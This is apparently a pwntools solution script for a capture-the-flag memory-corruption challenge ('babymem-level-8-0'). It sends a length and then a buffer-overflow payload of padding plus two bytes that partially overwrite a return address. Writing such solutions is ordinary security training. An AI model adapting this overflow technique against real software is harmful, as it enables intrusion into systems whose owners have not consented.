from pwn import *

elf = ELF('/challenge/babymem-level-8-0')

io = elf.process()

# This must be exact, otherwise a 0x0a appears, for some reasons
io.sendline(b'106')

payload = b'\x00' + b'A'*103 + b'\x5d' + b'\x21'
io.sendline(payload)

io.interactive()
